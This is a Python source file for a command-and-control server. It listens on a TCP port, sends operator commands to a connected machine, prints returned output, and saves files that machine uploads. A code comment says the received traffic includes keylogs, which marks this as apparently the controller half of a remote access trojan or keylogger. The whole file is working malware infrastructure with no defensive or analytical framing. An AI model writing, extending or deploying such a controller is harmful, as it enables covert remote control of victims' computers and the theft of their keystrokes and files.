import socket
import os
import threading

HOST = '0.0.0.0'
PORT = 7771
DOWNLOAD_FOLDER = r"C:\Users\ghost\Desktop\server"

def handle_client(conn, addr):
    print(f"[+] Connected to {addr}")

    def receive_data():
        buffer = b""
        file_mode = False
        filename = ""

        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break

                # Start file transfer
                if b"FILE_TRANSFER_BEGIN" in data:
                    file_mode = True
                    buffer = b""
                    continue

                # File transfer complete
                if file_mode:
                    if b"FILE_TRANSFER_END" in data:
                        file_mode = False
                        os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
                        safe_name = os.path.basename(filename)
                        save_path = os.path.join(DOWNLOAD_FOLDER, safe_name)

                        with open(save_path, "wb") as f:
                            f.write(buffer)
                        print(f"[+] File saved to: {save_path}")
                        filename = ""
                        continue

                    elif not filename:
                        filename = data.decode().strip()
                    else:
                        buffer += data
                else:
                    # Print all other messages (keylogs, Wikipedia, responses, etc.)
                    print(data.decode(errors="ignore").strip())

            except Exception as e:
                print(f"[-] Error receiving data: {e}")
                break

    threading.Thread(target=receive_data, daemon=True).start()

    try:
        while True:
            cmd = input("Command> ").strip()
            if cmd:
                conn.sendall(cmd.encode())
    except KeyboardInterrupt:
        print("\n[!] Server shutting down.")
    finally:
        conn.close()

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"[+] Listening on {HOST}:{PORT}...")
        conn, addr = s.accept()
        handle_client(conn, addr)

if __name__ == "__main__":
    start_server()
